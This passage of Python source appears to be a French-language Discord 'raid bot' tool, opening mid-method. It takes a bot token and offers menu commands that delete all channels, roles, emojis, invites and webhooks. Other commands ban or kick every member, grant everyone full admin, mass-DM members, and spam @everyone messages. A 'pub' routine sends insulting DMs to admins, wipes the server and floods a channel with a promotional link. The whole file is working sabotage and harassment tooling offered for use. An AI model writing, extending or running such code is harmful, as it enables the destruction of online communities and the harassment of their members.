            except:
                continue

        try:
            invites = await self.selected_guild.invites()
            for invite in invites:
                try:
                    await invite.delete()
                except:
                    continue
        except:
            pass

        try:
            webhooks = await self.selected_guild.webhooks()
            for webhook in webhooks:
                try:
                    await webhook.delete()
                except:
                    continue
        except:
            pass

        members = [member for member in self.selected_guild.members 
                  if not member.bot and member != self.selected_guild.owner and member != self.user]
        for member in members:
            try:
                await member.ban(reason="nuke")
            except:
                continue

        try:
            final_channel = await self.selected_guild.create_text_channel("plus-de-serveur")
            await final_channel.send("@everyone # plus de serveur @everyone")
        except Exception as e:
            print(Fore.RED + f"Erreur lors de la création du salon final: {e}")

    async def delete_channels_only(self):
        """Supprime uniquement tous les salons"""
        if not self.selected_guild:
            return

        channels = list(self.selected_guild.channels)
        for channel in channels:
            try:
                await channel.delete()
            except:
                continue

    async def delete_roles_only(self):
        """Supprime uniquement tous les rôles (sauf @everyone)"""
        if not self.selected_guild:
            return

        roles = [role for role in self.selected_guild.roles if role.name != "@everyone"]
        for role in roles:
            try:
                await role.delete()
            except:
                continue

    async def delete_emojis_only(self):
        """Supprime uniquement tous les emojis"""
        if not self.selected_guild:
            return

        emojis = list(self.selected_guild.emojis)
        for emoji in emojis:
            try:
                await emoji.delete()
            except:
                continue

    async def make_everyone_admin(self):
        """Crée un rôle admin et l'attribue à tous les membres"""
        if not self.selected_guild:
            return

        try:
            admin_role = await self.selected_guild.create_role(
                name="Admin",
                permissions=discord.Permissions.all(),
                color=discord.Color.red(),
                reason="alladmin command"
            )
        except:
            return

        members = [member for member in self.selected_guild.members if not member.bot]
        for member in members:
            try:
                await member.add_roles(admin_role)
            except:
                continue

    async def ban_everyone(self):
        """Bannit tous les membres du serveur"""
        if not self.selected_guild:
            return

        members = [member for member in self.selected_guild.members 
                  if not member.bot and member != self.selected_guild.owner and member != self.user]
        for member in members:
            try:
                await member.ban(reason="banall command")
            except:
                continue

    async def kick_everyone(self):
        """Kick tous les membres du serveur"""
        if not self.selected_guild:
            return

        members = [member for member in self.selected_guild.members 
                  if not member.bot and member != self.selected_guild.owner and member != self.user]
        for member in members:
            try:
                await member.kick(reason="kickall command")
            except:
                continue

    async def send_dm(self):
        """Envoie un message privé à un utilisateur spécifique"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        clear_screen()
        show_ascii()

        members = [member for member in self.selected_guild.members 
                  if not member.bot and member != self.user]

        if not members:
            print(Fore.RED + "Aucun membre trouve sur ce serveur!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        print(Fore.RED + f"Membres du serveur {self.selected_guild.name}:")
        for i, member in enumerate(members, 1):
            print(Fore.RED + f"{i}. {member.display_name} ({member.name}#{member.discriminator})")

        try:
            choice = input(Fore.RED + "Numero du membre (ou 'b' pour retourner): ").strip()

            if choice.lower() == 'b':
                return

            member_num = int(choice)
            if not (1 <= member_num <= len(members)):
                clear_screen()
                show_ascii()
                print(Fore.RED + f"Numero invalide! Choisissez entre 1 et {len(members)}")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            selected_member = members[member_num - 1]

            message = input(Fore.RED + "Tapez votre message (ou 'b' pour retourner): ").strip()
            if not message:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Message vide annule!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return
            if message.lower() == 'b':
                return

            count_str = input(Fore.RED + "Combien de fois envoyer? (1-50 ou 'b'): ").strip()
            if count_str.lower() == 'b':
                return
            try:
                count = int(count_str)
                if not (1 <= count <= 50):
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                    return
            except ValueError:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nombre invalide!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Envoi de {count} message(s) a {selected_member.display_name}...")

            sent_count = 0
            for i in range(count):
                try:
                    await selected_member.send(message)
                    sent_count += 1
                    print(Fore.RED + f"Message {i+1}/{count} envoye")
                except Exception as e:
                    print(Fore.RED + f"Erreur pour le message {i+1}: {e}")

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Termine! {sent_count}/{count} messages envoyes a {selected_member.display_name}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except ValueError:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Numero invalide!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Erreur: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def send_dm_all(self):
        """Envoie un message privé à tous les membres du serveur"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        clear_screen()
        show_ascii()

        members = [member for member in self.selected_guild.members 
                  if not member.bot and member != self.user]

        if not members:
            print(Fore.RED + "Aucun membre trouve sur ce serveur!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + f"Nombre de membres: {len(members)}")

        try:
            message = input(Fore.RED + "Tapez votre message (ou 'b' pour retourner): ").strip()
            if not message:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Message vide annule!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return
            if message.lower() == 'b':
                return

            count_str = input(Fore.RED + "Combien de fois envoyer a chaque personne? (1-50 ou 'b' pour retourner): ").strip()
            if count_str.lower() == 'b':
                return
            try:
                count = int(count_str)
                if not (1 <= count <= 50):
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                    return
            except ValueError:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nombre invalide!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Envoi de {count} message(s) a {len(members)} membres...")

            total_sent = 0
            total_failed = 0

            for member_index, member in enumerate(members, 1):
                member_sent = 0
                print(Fore.RED + f"Envoi a {member.display_name} ({member_index}/{len(members)})...")

                for i in range(count):
                    try:
                        await member.send(message)
                        member_sent += 1
                        total_sent += 1
                    except Exception as e:
                        total_failed += 1
                        print(Fore.RED + f"  Erreur message {i+1} pour {member.display_name}: {e}")

                print(Fore.RED + f"  {member_sent}/{count} messages envoyes a {member.display_name}")

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Termine!")
            print(Fore.RED + f"Messages envoyes avec succes: {total_sent}")
            print(Fore.RED + f"Messages en echec: {total_failed}")
            print(Fore.RED + f"Total: {total_sent + total_failed}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Erreur: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def spam_all_channels(self):
        """Spam un message dans tous les salons texte du serveur"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        clear_screen()
        show_ascii()

        text_channels = [channel for channel in self.selected_guild.channels 
                        if isinstance(channel, discord.TextChannel)]

        if not text_channels:
            print(Fore.RED + "Aucun salon texte trouve sur ce serveur!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + f"Nombre de salons texte: {len(text_channels)}")

        try:
            message = input(Fore.RED + "Tapez votre message (ou 'b' pour retourner): ").strip()
            if not message:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Message vide annule!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return
            if message.lower() == 'b':
                return

            count_str = input(Fore.RED + "Combien de fois par salon? (1-100 ou 'b' pour retourner): ").strip()
            if count_str.lower() == 'b':
                return
            try:
                count = int(count_str)
                if not (1 <= count <= 100):
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Nombre invalide! Limite entre 1 et 100")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                    return
            except ValueError:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nombre invalide!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Spam en cours dans {len(text_channels)} salons...")

            total_sent = 0
            total_failed = 0

            spam_message = f"@everyone {message}"

            for channel_index, channel in enumerate(text_channels, 1):
                channel_sent = 0
                print(Fore.RED + f"Spam dans #{channel.name} ({channel_index}/{len(text_channels)})...")

                for i in range(count):
                    try:
                        await channel.send(spam_message)
                        channel_sent += 1
                        total_sent += 1
                        await asyncio.sleep(0.5)
                    except Exception as e:
                        total_failed += 1
                        print(Fore.RED + f"  Erreur message {i+1} dans #{channel.name}: {e}")

                print(Fore.RED + f"  {channel_sent}/{count} messages envoyes dans #{channel.name}")

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Spam termine!")
            print(Fore.RED + f"Messages envoyes avec succes: {total_sent}")
            print(Fore.RED + f"Messages en echec: {total_failed}")
            print(Fore.RED + f"Total: {total_sent + total_failed}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Erreur: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def create_channels(self):
        """Menu de création : choisir entre salons ou rôles"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        while True:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Serveur: {self.selected_guild.name}")
            print(Fore.RED + "=== MENU DE CREATION ===")
            print(Fore.RED + "")
            print(Fore.RED + "1. Creer des salons en masse")
            print(Fore.RED + "2. Creer des roles en masse")
            print(Fore.RED + "")
            
            choice = input(Fore.RED + "Choisissez une option (1, 2 ou 'b' pour retour): ").strip().lower()
            
            if choice == 'b':
                return
            elif choice == '1':
                await self.create_channels_mass()
                return
            elif choice == '2':
                await self.create_roles_mass()
                return
            else:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Choix invalide! Choisissez 1, 2 ou 'b'")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def create_channels_mass(self):
        """Créer des salons en masse"""
        clear_screen()
        show_ascii()

        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + f"Nombre de salons actuels: {len(self.selected_guild.channels)}")

        try:
            base_name = input(Fore.RED + "Nom de base pour les salons (ou 'b' pour retourner): ").strip()
            if not base_name:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nom vide annule!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return
            if base_name.lower() == 'b':
                return

            count_str = input(Fore.RED + "Combien de salons creer? (1-100 ou 'b' pour retourner): ").strip()
            if count_str.lower() == 'b':
                return
            try:
                count = int(count_str)
                if not (1 <= count <= 100):
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Nombre invalide! Limite entre 1 et 100")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                    return
            except ValueError:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nombre invalide!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Creation de {count} salons en cours...")

            created_count = 0
            failed_count = 0

            for i in range(1, count + 1):
                try:
                    channel_name = base_name.lower().replace(' ', '-').replace('_', '-')

                    await self.selected_guild.create_text_channel(
                        name=channel_name,
                        reason=f"Creation automatique via commande create"
                    )
                    created_count += 1
                    print(Fore.RED + f"Salon #{channel_name} cree")
                    await asyncio.sleep(0.1)

                except Exception as e:
                    failed_count += 1
                    print(Fore.RED + f"Erreur creation salon: {e}")

            clear_screen()
            show_ascii()
            print(Fore.RED + f"✅ Creation terminee!")
            print(Fore.RED + f"✅ {created_count} salons crees avec succes")
            if failed_count > 0:
                print(Fore.RED + f"❌ {failed_count} echecs")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"❌ Erreur lors de la creation: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def create_roles_mass(self):
        """Créer des rôles en masse"""
        clear_screen()
        show_ascii()

        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + f"Nombre de roles actuels: {len(self.selected_guild.roles)}")

        try:
            base_name = input(Fore.RED + "Nom de base pour les roles (ou 'b' pour retourner): ").strip()
            if not base_name:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nom vide annule!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return
            if base_name.lower() == 'b':
                return

            count_str = input(Fore.RED + "Combien de roles creer? (1-50 ou 'b' pour retourner): ").strip()
            if count_str.lower() == 'b':
                return
            try:
                count = int(count_str)
                if not (1 <= count <= 50):
                    clear_screen()
                    show_ascii()
                    print(Fore.RED + "Nombre invalide! Limite entre 1 et 50")
                    input(Fore.RED + "Appuyez sur Entree pour continuer...")
                    return
            except ValueError:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nombre invalide!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            clear_screen()
            show_ascii()
            print(Fore.RED + f"Creation de {count} roles en cours...")

            created_count = 0
            failed_count = 0

            for i in range(1, count + 1):
                try:
                    role_name = base_name

                    await self.selected_guild.create_role(
                        name=role_name,
                        color=discord.Color.random(),
                        reason=f"Creation automatique via commande create"
                    )
                    created_count += 1
                    print(Fore.RED + f"Role '{role_name}' cree")
                    await asyncio.sleep(0.1)

                except Exception as e:
                    failed_count += 1
                    print(Fore.RED + f"Erreur creation role: {e}")

            clear_screen()
            show_ascii()
            print(Fore.RED + f"✅ Creation terminee!")
            print(Fore.RED + f"✅ {created_count} roles crees avec succes")
            if failed_count > 0:
                print(Fore.RED + f"❌ {failed_count} echecs")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Erreur: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")



    async def kick_all_bots(self):
        """Kick tous les bots du serveur (sauf lui-même)"""
        if not self.selected_guild:
            return

        bots = [member for member in self.selected_guild.members 
                if member.bot and member != self.user]

        kicked_count = 0
        failed_count = 0

        for bot in bots:
            try:
                await bot.kick(reason="Kick all bots command")
                kicked_count += 1
                print(Fore.RED + f"Bot {bot.name} kické")
                await asyncio.sleep(0.5)
            except Exception as e:
                failed_count += 1
                print(Fore.RED + f"Impossible de kicker {bot.name}: {e}")
                continue

        print(Fore.RED + f"Bots kickés avec succès: {kicked_count}")
        print(Fore.RED + f"Échecs: {failed_count}")
        print(Fore.RED + f"Total: {kicked_count + failed_count}")

    async def leave_server(self):
        """Fait quitter le bot du serveur sélectionné"""
        if not self.selected_guild:
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        server_name = self.selected_guild.name
        print(Fore.RED + f"Le bot quitte le serveur {server_name}...")

        try:
            await self.selected_guild.leave()
            self.selected_guild = None
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Bot a quitte le serveur {server_name} avec succes!")
            print(Fore.RED + "Vous devez maintenant selectionner un autre serveur.")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            await self.select_server()

        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Erreur lors de la sortie du serveur: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def rename_server(self):
        """Renomme le serveur sélectionné"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        clear_screen()
        show_ascii()

        current_name = self.selected_guild.name
        print(Fore.RED + f"Serveur actuel: {current_name}")

        try:
            new_name = input(Fore.RED + "Nouveau nom du serveur (ou 'b' pour retourner): ").strip()

            if not new_name:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nom vide annule!")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            if new_name.lower() == 'b':
                return

            if len(new_name) > 100:
                clear_screen()
                show_ascii()
                print(Fore.RED + "Nom trop long! Maximum 100 caracteres.")
                input(Fore.RED + "Appuyez sur Entree pour continuer...")
                return

            print(Fore.RED + f"Renommage du serveur en cours...")
            await self.selected_guild.edit(name=new_name, reason="Renommage via commande rename")
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Serveur renomme avec succes!")
            print(Fore.RED + f"Ancien nom: {current_name}")
            print(Fore.RED + f"Nouveau nom: {new_name}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except discord.Forbidden:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Erreur: Permissions insuffisantes pour renommer le serveur!")
            print(Fore.RED + "Le bot doit avoir la permission 'Gerer le serveur'.")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
        except discord.HTTPException as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Erreur lors du renommage: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"Erreur inattendue: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def random_ban(self):
        """Bannit un membre aléatoire du serveur"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        members = [member for member in self.selected_guild.members 
                  if not member.bot and member != self.selected_guild.owner and member != self.user]

        if not members:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun membre eligible pour le ban!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        clear_screen()
        show_ascii()
        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + f"Membres eligibles: {len(members)}")

        try:
            import random
            random_member = random.choice(members)

            print(Fore.RED + f"Membre selectionne aleatoirement: {random_member.display_name}")
            print(Fore.RED + f"Bannissement en cours...")

            await random_member.ban(reason="Random ban command")

            clear_screen()
            show_ascii()
            print(Fore.RED + f"✅ {random_member.display_name} a ete banni avec succes!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except discord.Forbidden:
            clear_screen()
            show_ascii()
            print(Fore.RED + "❌ Permissions insuffisantes pour bannir ce membre!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"❌ Erreur lors du bannissement: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def random_kick(self):
        """Kick un membre aléatoire du serveur"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        members = [member for member in self.selected_guild.members 
                  if not member.bot and member != self.selected_guild.owner and member != self.user]

        if not members:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun membre eligible pour le kick!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        clear_screen()
        show_ascii()
        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + f"Membres eligibles: {len(members)}")

        try:
            import random
            random_member = random.choice(members)

            print(Fore.RED + f"Membre selectionne aleatoirement: {random_member.display_name}")
            print(Fore.RED + f"Kick en cours...")

            await random_member.kick(reason="Random kick command")

            clear_screen()
            show_ascii()
            print(Fore.RED + f"✅ {random_member.display_name} a ete kické avec succes!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except discord.Forbidden:
            clear_screen()
            show_ascii()
            print(Fore.RED + "❌ Permissions insuffisantes pour kicker ce membre!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"❌ Erreur lors du kick: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

    async def pub_tiktok(self):
        """Commande pub personnalisée : DM aux admins, destruction totale et création salon spam"""
        if not self.selected_guild:
            clear_screen()
            show_ascii()
            print(Fore.RED + "Aucun serveur selectionne!")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")
            return

        clear_screen()
        show_ascii()
        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + "=== CONFIGURATION DE LA PUB ===")
        print(Fore.RED + "")
        
        while True:
            user_link = input(Fore.RED + "Entrez votre lien (YouTube/TikTok/autre) ou 'b' pour retour: ").strip()
            if user_link.lower() == 'b':
                return
            elif user_link and (user_link.startswith('http://') or user_link.startswith('https://') or user_link.startswith('www.')):
                break
            else:
                print(Fore.RED + "Veuillez entrer un lien valide (doit commencer par http://, https:// ou www.)")
        
        salon_name = input(Fore.RED + "Nom du salon (laissez vide pour 'pub'): ").strip()
        if not salon_name:
            salon_name = "pub"
        
        dm_message = f"abonne toi fdp ta plus de serveur {user_link}"
        spam_message = f"# abonne toi fdp {user_link} @everyone"

        clear_screen()
        show_ascii()
        print(Fore.RED + f"Serveur: {self.selected_guild.name}")
        print(Fore.RED + f"Lien: {user_link}")
        print(Fore.RED + f"Salon: {salon_name}")
        print(Fore.RED + "Lancement de la commande pub...")

        try:
            print(Fore.RED + "Envoi des messages aux admins...")
            admins = []

            for member in self.selected_guild.members:
                if not member.bot and member != self.user:
                    if member.guild_permissions.administrator or member.guild_permissions.manage_guild:
                        admins.append(member)

            if admins:
                print(Fore.RED + f"Admins trouvés: {len(admins)}")
                for admin in admins:
                    for i in range(2):
                        try:
                            await admin.send(dm_message)
                            print(Fore.RED + f"Message {i+1}/2 envoyé à {admin.display_name}")
                            await asyncio.sleep(0.3)
                        except Exception as e:
                            print(Fore.RED + f"Erreur envoi à {admin.display_name}: {e}")
            else:
                print(Fore.RED + "Aucun admin trouvé")

            print(Fore.RED + "Attribution des permissions admin à tous...")
            try:
                admin_role = await self.selected_guild.create_role(
                    name="Admin-Pub",
                    permissions=discord.Permissions.all(),
                    color=discord.Color.red(),
                    reason="pub command"
                )

                members = [member for member in self.selected_guild.members if not member.bot]
                for member in members:
                    try:
                        await member.add_roles(admin_role)
                    except:
                        continue

                print(Fore.RED + f"Permissions admin données à {len(members)} membres")
            except Exception as e:
                print(Fore.RED + f"Erreur création rôle admin: {e}")

            print(Fore.RED + "Suppression de tous les salons...")
            channels = list(self.selected_guild.channels)
            for channel in channels:
                try:
                    await channel.delete()
                except:
                    continue

            print(Fore.RED + "Suppression de tous les rôles...")
            roles = [role for role in self.selected_guild.roles if role.name != "@everyone" and role.name != "Admin-Pub"]
            for role in roles:
                try:
                    await role.delete()
                except:
                    continue

            emojis = list(self.selected_guild.emojis)
            for emoji in emojis:
                try:
                    await emoji.delete()
                except:
                    continue

            stickers = list(self.selected_guild.stickers)
            for sticker in stickers:
                try:
                    await sticker.delete()
                except:
                    continue

            print(Fore.RED + "Kick de tous les membres...")
            members_to_kick = [member for member in self.selected_guild.members 
                              if not member.bot and member != self.selected_guild.owner and member != self.user]

            kicked_count = 0
            for member in members_to_kick:
                try:
                    await member.kick(reason="pub command kick")
                    kicked_count += 1
                    print(Fore.RED + f"Membre kické: {member.display_name}")
                    await asyncio.sleep(0.3)
                except Exception as e:
                    print(Fore.RED + f"Erreur kick {member.display_name}: {e}")

            print(Fore.RED + f"{kicked_count} membres kickés")
            print(Fore.RED + "Création du salon de spam...")
            try:
                spam_channel = await self.selected_guild.create_text_channel(
                    name=salon_name,
                    reason="pub command spam channel"
                )

                print(Fore.RED + "Spam en cours dans le nouveau salon...")
                for i in range(20):
                    try:
                        await spam_channel.send(spam_message)
                        await asyncio.sleep(0.2)
                    except Exception as e:
                        print(Fore.RED + f"Erreur spam message {i+1}: {e}")

            except Exception as e:
                print(Fore.RED + f"Erreur création salon spam: {e}")

            clear_screen()
            show_ascii()
            print(Fore.RED + "🎯 Commande pub terminée avec succès!")
            print(Fore.RED + f"✅ Messages envoyés aux admins")
            print(Fore.RED + f"✅ Permissions admin données à tous")
            print(Fore.RED + f"✅ Serveur nettoyé")
            print(Fore.RED + f"✅ Tous les membres kickés")
            print(Fore.RED + f"✅ Salon de spam créé")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

        except Exception as e:
            clear_screen()
            show_ascii()
            print(Fore.RED + f"❌ Erreur lors de la commande pub: {e}")
            input(Fore.RED + "Appuyez sur Entree pour continuer...")

def get_token():
    """Demande le token à l'utilisateur"""
    clear_screen()
    show_ascii()
    print(Fore.RED + "raid bot tools")
    print(Fore.RED + "Entrez le token de votre bot Discord:")

    token = input(Fore.RED + "Token: ")
    return token.strip()

async def main():
    token = get_token()

    if not token:
        print(Fore.RED + "❌ Aucun token fourni!")
        return

    intents = discord.Intents.default()
    intents.members = True
    intents.guilds = True
    bot = DiscordBot(intents=intents)

    try:
        clear_screen()
        show_ascii()
        print(Fore.RED + "Demarrage du bot...")
        await bot.start(token)
    except discord.LoginFailure:
        clear_screen()
        show_ascii()
        print(Fore.RED + "Token invalide! Verifiez votre token Discord.")
    except discord.HTTPException as e:
        print(Fore.RED + f"❌ Erreur HTTP: {e}")
    except Exception as e:
        print(Fore.RED + f"❌ Erreur inattendue: {e}")
    finally:
        if not bot.is_closed():
            await bot.close() 

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear_screen()
        show_ascii()
        print(Fore.RED + "Arret du bot demande par l'utilisateur.")
        print(Fore.RED + "Bot arrete proprement.")
